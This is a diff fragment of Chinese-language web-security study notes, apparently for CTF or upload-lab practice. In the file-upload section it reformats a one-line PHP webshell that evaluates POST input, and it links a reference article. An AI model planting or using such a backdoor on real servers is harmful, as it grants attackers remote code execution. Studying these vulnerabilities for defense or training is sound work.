@@ -332,10 +332,8 @@ __toString()             //当反序列化后的对象被输出在模板中的�
 多见于图片文件上传处
 
 #### 一句话木马：
-<?php eval ($_POST[0]);`
-
+`<?php eval ($_POST[0]); `
 更多见参考文档：[文件上传漏洞 (上传知识点、题型总结大全-upload靶场全解)_upload靶场题型-CSDN博客](https://blog.csdn.net/qq_43390703/article/details/104858705)
-
 ## 文件包含
 参考文档：
 
